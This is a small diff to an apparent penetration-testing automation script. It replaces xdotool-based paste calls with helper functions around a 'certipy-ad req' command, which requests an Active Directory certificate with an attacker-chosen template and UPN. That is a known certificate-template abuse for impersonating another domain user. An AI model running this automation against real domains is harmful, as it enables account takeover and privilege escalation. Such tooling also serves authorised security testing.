@@ -24,9 +24,9 @@ CA_NAME=${form_data["ca_name"]}
 TEMPLATE=${form_data["template"]}
 UPN=${form_data["upn_user"]}
 
-paste_command "certipy-ad req -u ${USERNAME}@${DOMAIN} -p '${PASSWORD}' -dc-ip ${IP} -ca ${CA_NAME} -template ${TEMPLATE} -upn ${UPN}"
-xdotool key Return
+execute_command "certipy-ad req -u ${USERNAME}@${DOMAIN} -p '${PASSWORD}' -dc-ip ${IP} -ca ${CA_NAME} -template ${TEMPLATE} -upn ${UPN}"
+create_new_line
 sleep 1
 
-paste_command "y"
-xdotool key Return
+execute_command "y"
+create_new_line
